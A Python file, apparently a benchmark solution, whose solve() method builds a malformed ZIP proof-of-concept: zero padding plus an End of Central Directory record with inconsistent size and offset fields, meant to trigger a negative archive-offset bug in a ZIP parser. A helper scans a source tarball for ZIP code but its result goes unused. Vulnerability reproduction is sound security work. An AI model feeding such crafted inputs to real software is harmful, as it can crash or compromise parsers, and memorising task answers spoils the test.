import os
import struct
import tarfile
from typing import Optional


class Solution:
    def _zip_negative_archive_start_offset_poc(self) -> bytes:
        prelude = b"\x00" * 24
        eocd = struct.pack(
            "<4sHHHHIIH",
            b"PK\x05\x06",  # End of Central Directory signature
            0,              # number of this disk
            0,              # disk where central directory starts
            1,              # number of central directory records on this disk
            1,              # total number of central directory records
            1,              # size of central directory (bytes)
            24,             # offset of start of central directory (relative to archive start)
            0,              # ZIP file comment length
        )
        poc = prelude + eocd
        return poc

    def _looks_like_zip_offset_bug_project(self, src_path: str) -> bool:
        if not src_path or not os.path.exists(src_path):
            return False
        try:
            with tarfile.open(src_path, "r:*") as tf:
                hits = 0
                for m in tf.getmembers():
                    if not m.isfile() or m.size <= 0 or m.size > 2_000_000:
                        continue
                    n = m.name.lower()
                    if not n.endswith((".c", ".cc", ".cpp", ".h", ".hpp")):
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    if not data:
                        continue
                    if b"central directory" in data.lower() and (b"archive_offset" in data or b"archive offset" in data):
                        hits += 1
                    if b"PK\x05\x06" in data:
                        hits += 2
                    if hits >= 2:
                        return True
        except Exception:
            return False
        return False

    def solve(self, src_path: str) -> bytes:
        # If the project doesn't look like a ZIP parser, still return the best-guess PoC.
        _ = self._looks_like_zip_offset_bug_project(src_path)
        return self._zip_negative_archive_start_offset_poc()